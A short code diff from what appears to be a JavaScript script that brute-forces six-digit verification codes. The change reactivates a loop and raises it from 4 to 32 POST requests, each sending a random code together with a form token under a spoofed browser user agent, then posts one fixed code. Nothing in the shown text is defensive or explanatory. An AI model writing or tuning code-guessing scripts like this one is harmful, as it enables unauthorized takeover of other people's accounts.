@@ -25,12 +25,12 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
   // child_process.exec('siren warn');
 
   const p = [];
-  // for (let i = 0, code; 4 > i; ++i) {
-  //   code = rand(111111, 999999);
-  //   p.push(new Promise(r => httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n='+code).then(res => (log(res.statusCode), r()))));
-  // }
+  for (let i = 0, code; 32 > i; ++i) {
+    code = rand(111111, 999999);
+    p.push(new Promise(r => httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n='+code).then(res => (log(res.statusCode), r()))));
+  }
 
   Promise.all(p).then(() => {
-    httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n=896474').then(res => log(res.statusCode));
+    httpClient.post(url, headers, 'lsd=AVrCihG3UJY&n=896475').then(res => log(res.statusCode));
   });
 })();
